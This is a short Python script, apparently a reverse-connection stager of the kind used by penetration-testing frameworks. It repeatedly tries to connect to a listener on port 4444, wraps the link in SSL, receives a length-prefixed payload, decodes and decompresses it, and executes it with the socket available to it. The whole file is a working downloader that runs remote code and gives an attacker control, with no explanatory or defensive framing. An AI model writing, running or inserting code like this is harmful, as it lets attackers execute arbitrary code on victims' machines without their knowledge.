import zlib,base64,ssl,socket,struct,time
for x in range(10):
	try:
		so=socket.socket(2,1)
		so.connect(('0.0.0.0',4444))
		s=ssl.wrap_socket(so)
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
